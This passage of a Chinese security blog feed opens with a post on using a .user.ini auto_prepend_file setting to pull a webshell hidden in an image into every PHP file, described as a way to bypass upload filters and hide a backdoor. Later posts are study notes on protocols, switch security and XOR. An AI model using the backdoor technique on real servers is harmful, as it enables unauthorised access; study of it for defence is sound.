<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
<p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p>
<p>Php配置项中有两个比较有意思的项（下图第一、四个）：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075273188.png" alt="" loading="lazy"><br>
auto_append_file、auto_prepend_file，点开看看什么意思：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075289853.png" alt="" loading="lazy"></p>
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br>
auto_prepend_file=01.gif</p>
<p>01.gif是要包含的文件。</p>
<p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
<p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075364785.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075368008.png" alt="" loading="lazy"><br>
访问echo.php即可看到后门：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075388506.png" alt="" loading="lazy"><br>
Nginx下同样：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075413515.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075417233.png" alt="" loading="lazy"><br>
那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
<p>参考文献：</p>
<p>https://www.cnblogs.com/qianxiao996/p/13574589.html<br>
http://php.net/manual/zh/ini.list.php<br>
http://php.net/manual/zh/configuration.changes.modes.php<br>
http://php.net/manual/zh/configuration.file.per-user.php<br>
http://php.net/manual/zh/configuration.changes.php</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[应用层协议]]></title>
        <id>https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/</id>
        <link href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">
        </link>
        <updated>2021-05-26T12:28:29.000Z</updated>
        <content type="html"><![CDATA[<p>TCP<br>
FTP：定义了文件传输协议，使用21端口<br>
Telnet：他是一种用于远程登录的端口，23端口<br>
SMTP：定义了简单邮件传送协议，服务器开放的是25端口<br>
POP3：他适合SMTP对应，POP3用于接收邮件<br>
HTTP<br>
UDP对应的应用层协议<br>
DNS：用于域名解析服务，用的是53端口<br>
SNMP：简单网络管理协议，用的是161端口<br>
TFTP（Trival File Transfer Protocal）：简单文件传输协议，69</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[局域网交换机安全]]></title>
        <id>https://jinqipiaopiao.github.io/post/ju-yu-wang-jiao-huan-ji-an-quan/</id>
        <link href="https://jinqipiaopiao.github.io/post/ju-yu-wang-jiao-huan-ji-an-quan/">
        </link>
        <updated>2021-05-23T06:27:53.000Z</updated>
        <content type="html"><![CDATA[<h1 id="写于2021553学习了第一章">写于2021.5.53（学习了第一章）</h1>
<p>1.安全的三要素：保密性（确保数据处于隐秘状态），完整性（仅允许被授权的人员变更数据），可用性（数据必须随时可以访问，随时准备就绪）。</p>
<p>2.保密性：确保机密状态的能力，完整性：确保有价值的信息、数据部被篡改的能力，可用性：业务和数据的可用性</p>
<p>保密性：确保机密状态的能力<br>
确保保密性的常见技术手段如下所示：0️⃣防护箱（只有知道密码或有权使用该箱特定人士访问）1️⃣加密保护（任何人都可以访问该信息的无效形式，但是只有期望的接受值可以访问该信息的有效形式）<br>
针对保密性的攻击（也称信息揭露）就是破坏信息的隐密状态，许多人错误的认为信息在跨网络发送时收到保密性的保护，事实并非如此，攻击者（或网络故障的排查者）经常使用数据包嗅探工具（sniffer）来查看网络流量，从不提供保密性的协议中（例如telnet协议或pop协议）提取用户的通行证（包括用户名密码）</p>
<p>完整性：确保有价值的信息、数据部被篡改的能力<br>
完整性被定义为数据（或其他有价值的信息）所具有的可变必知（数据只要被修改，就可以检测到）的能力<br>
在网络方面，一个适用于完整性的例子是对一台交换机进行配置：除非持有正确的通行证，任何人都不能修改该交换机的配置，而且即便获得授权的人员对配置做出修改也会通过一条syslog消息留下痕迹（一个攻击者可以蓄意删除i相关的syslog消息）</p>
<p>可用性：数据必须随时可以访问随时准备就绪<br>
最后一个安全原则就是数据和服务的可用性，若数据不可用，机密而又未被篡改的数据又有何用，针对可用性的攻击称为中断攻击，在网络界中则被称作拒绝服务攻击（DOS）攻击<br>
3.逆向安全三要素<br>
就是与安全相对应，泄密（机密的泄露），篡改（数据被随意修改），中断（业务或者数据不可再用）</p>
<p>4.风险管理<br>
分为风险分析（脆弱性，威胁，风险，暴露）<br>
风险控制（降低，转移，接受，忽略）</p>
<p>5.访问控制和身份管理<br>
在网络中，最典型的控制就是访问控制，当行为主体（主动实体，比如一个用户，工作站，程序，IP地址）发起访问一个对象（被动实体，比如一个以太网vlan，文件，服务器，internet）时，必须检查其安全策略并强制执行<br>
访问控制可以入cisco ios访问控制列表（acl）般简单，也可以更为复杂并基于一个用户的身份<br>
身份管理依赖于身份，认证，授权，审计</p>
<p>6.对称加密系统和非对称加密系统<br>
对称加密系统对于加密和解密操作使用一个相同的密钥，对称加密系统包括堆成加密以及哈希运算辅助下的消息认证<br>
1.对称加密（是指当加密和解密的时候，使用同一密钥）该密钥被称为共享密钥和会话密钥<br>
密钥分发可以又两种方式进行：<br>
带外（秘密的经由实际数据通信方式之外的渠道来发送）带内（秘密的与被其加密的数据使用相同的信道来传递）<br>
2.哈希函数<br>
对称加密系统的目的并非仅仅只是加密，他还兼具检查数据来源的功能。<br>
例如对称加密系统：加密哈希函数（有两个属性一个时单个比特的改变一定会得到一个完全不同的哈希输出，另外一个就是不能逆向计算原始输入）<br>
7.哈希消息认证码<br>
当加密的哈希函数与共享密钥结合使用的时候可以被用来证实消息数据的起源（因为只有知道共享密钥的唯一实体才可以生成该hmac（是一个对称加密系统--一个共享密钥证明了一个该密钥的拥有者生成了该消息），绝无其他实体可以生成，这证明该消息一定是被拥有该共享密钥使用权的实体生成）<br>
非对称加密系统，在认证和密钥分发方面，加密和解密分别使用了一个不同的密钥，两个密钥形成了一个密钥对，一为公钥一为私钥，一个单独的实体拥有并使用私钥，所有其他实体使用公钥（公私钥可以提供数据的保密性，完整性，和数字签名）<br>
1.用途辅之以加密，可实现保密性，2.辅之以签名，可实现完整性认证<br>
8.针对加密系统的攻击<br>
强力攻击，字典攻击，密码分析，中间人攻击，Dos攻击</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[探讨一下异或(xor)为什么能还原的问题]]></title>
        <id>https://jinqipiaopiao.github.io/post/tan-tao-yi-xia-yi-huo-xorwei-shi-me-neng-huan-yuan-de-wen-ti/</id>
        <link href="https://jinqipiaopiao.github.io/post/tan-tao-yi-xia-yi-huo-xorwei-shi-me-neng-huan-yuan-de-wen-ti/">
        </link>
        <updated>2021-05-22T01:44:57.000Z</updated>
        <content type="html"><![CDATA[<p>数学表示：<br>
        a ^ a ^ b = b;<br>
        a ^ b ^ a = b;<br>
        b ^ a ^ a = b;</p>
<p></p>
<p>原理：</p>
<p>可用穷举法证明：</p>
<p>异或运算：1 ^ 1 = 0；1 ^ 0 = 1;  0 ^ 1 = 1;  0 ^ 0 = 0;</p>
<p>穷举：</p>
<p>1 ^ 1 ^ 1 = 1；</p>
<p>1 ^ 1 ^ 0 = 0；</p>
<p>1 ^ 0 ^ 1 = 0；</p>
<p>0 ^ 1 ^ 1 = 0；</p>
<p>1 ^ 0 ^ 0 = 1；</p>
<p>0 ^ 1 ^ 0 = 1；</p>
<p>0 ^ 0 ^ 1 = 1；</p>
<p>0 ^ 0 ^ 0 = 0；</p>
<p>可知任意1或0出现两次，即可抵消。</p>
<p>从而推广至多个位（bit）。</p>
<p>一个数异或同一个数两次,结果还是那个数。  且异或的顺序可变。<br>
————————————————<br>
版权声明：本文为CSDN博主「Wilson_act」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/wilsonact/article/details/87075380</p>
<p><strong>如何证明这个结论呢？</strong><br>
观察xor的运算， 我们可以得出一个结论， 其实xor相当于不进位的加法。<br>
举个例子:<br>
num1: .byte 0b0<br>
num2: .byte 0b1</p>
<p>情况1<br>
xorb 0, num1 #结果 num1 ＝ 0b0  相当于 0 ＋ 0 ＝ 0<br>
xorb 1，num1 #结果 num1 ＝ 0b1  相当于 1 ＋ 0 ＝ 1</p>
<p>情况2<br>
xorb 0, num2 #结果 num2 ＝ 0b1 相当于 0 ＋ 1 ＝ 1<br>
xorb 1，num2 #结果 num2 ＝ 0b0 相当于 1 ＋ 1 ＝ 0b10, 进位被直接舍弃， 最后num2 = 0b0<br>
所以上述 a xor b xor b ＝＝ a， 可以先理解成 a ＋ b ＋ b == a 这个等式</p>
<p>假如 a 和 b 就是单纯的 一个bit位<br>
那么在这两次的连加中， 不管有没有进位，最后连加的结果的最低位一定等于a (这其中b是可以 ＝＝ a的)</p>
<p>这是二进制加法的特性，但是要注意的是连加的次数一定要是2的倍数，而且连加的被加数b一定要不变 (这其中b是可以 ＝＝ a的)</p>
<p>有了这个特性我们回过头去看xor</p>
<p>上面说了xor相当于不进位的加法，所以 a＋b＋b 最后计算的结果所有的进位全被舍弃，自然而然保留的结果一定 ＝＝ a</p>
<p>现在将a和b括展到多个bit位，那么原理是一样的， a xor b xor b， 还是相当于 a ＋ b ＋ b， xor会将每个对应的 bit位 都做 连续的加法，由于是不进位的，所以每次对应的bit位的连加是互不影响的，所以最后整个结果 所有的二进制bit位都相没有变， 所以最后的结果一定是a</p>
<p>xor上述这样的运算特性，可以做一些简单的加密</p>
<p>作者：聽歌的大肥豬<br>
链接：https://www.jianshu.com/p/0027bb0cfdec<br>
来源：简书<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
]]></content>
    </entry>
</feed>